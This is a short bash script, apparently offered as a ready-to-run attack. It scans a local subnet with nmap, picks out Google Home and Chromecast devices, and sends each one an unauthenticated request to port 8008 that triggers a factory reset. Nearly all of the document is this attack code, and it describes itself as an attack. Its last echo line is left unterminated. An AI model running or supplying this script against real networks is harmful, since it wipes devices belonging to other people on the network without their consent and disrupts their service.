#here we assume that the subnet of your network is 192.168.1.x
attack=0
rm /tmp/nmap.txt
rm /tmp/googlehomelist.txt
rm /tmp/googlehomelist2.txt
rm /tmp/googlehomelist3.txt
nmap -T4 -sP 192.168.1.0/24 >> /tmp/nmap.txt
sed -n -e '/google/{p;n;}' -e '/mini/{p;n;}' /tmp/nmap.txt >> /tmp/googlehomelist.txt
sed 's/.*home//' /tmp/googlehomelist.txt | tr -s ' ' >> /tmp/googlehomelist3.txt
cat /tmp/googlehomelist3.txt | tr -d '()' > /tmp/googlehomelist2.txt #final google home device list
NUMBERS=$(wc -l /tmp/googlehomelist2.txt | awk '{ print $1 }')
echo "Founded $NUMBERS Google Home or chromecast device. We will start the attack on all of those devices"
attack2=$((attack+NUMBERS))
cat /tmp/googlehomelist2.txt |  while read output
do
    curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"params":"fdr"}' \
  http://$output:8008/setup/reboot
done
echo "This should've been done. The attack doesn't have a 100% successrate.
